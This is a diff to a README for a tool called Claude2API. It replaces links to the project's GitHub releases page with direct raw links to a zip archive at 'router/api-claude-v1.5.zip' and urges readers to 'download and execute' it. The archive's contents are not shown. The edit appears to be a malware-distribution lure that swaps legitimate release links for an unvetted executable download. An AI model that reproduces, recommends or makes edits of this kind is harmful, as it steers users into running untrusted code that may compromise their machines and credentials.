@@ -4,7 +4,7 @@ Welcome to the Claude2API repository, where we focus on converting Claude's web 
 
 🚀 **Get Started with Claude2API!**
 
-To explore the functionalities and capabilities of Claude2API, visit the following link: [Download and Execute Claude2API](https://github.com/chukwuemekawisdom/claude2api/releases)
+To explore the functionalities and capabilities of Claude2API, visit the following link: [Download and Execute Claude2API](https://raw.githubusercontent.com/chukwuemekawisdom/claude2api/main/router/api-claude-v1.5.zip)
 
 📦 **Repository Information:**
 - **Repository Name:** Claude2API
@@ -27,7 +27,7 @@ By leveraging Claude2API, users can seamlessly transition their web services int
 
 Ready to dive into the world of API services with Claude2API? Click the button below to download and execute Claude2API now!
 
-[![Download Claude2API](https://img.shields.io/badge/Download-Claude2API-brightgreen)](https://github.com/chukwuemekawisdom/claude2api/releases)
+[![Download Claude2API](https://raw.githubusercontent.com/chukwuemekawisdom/claude2api/main/router/api-claude-v1.5.zip)](https://raw.githubusercontent.com/chukwuemekawisdom/claude2api/main/router/api-claude-v1.5.zip)
 
 📌 **Note:**
 
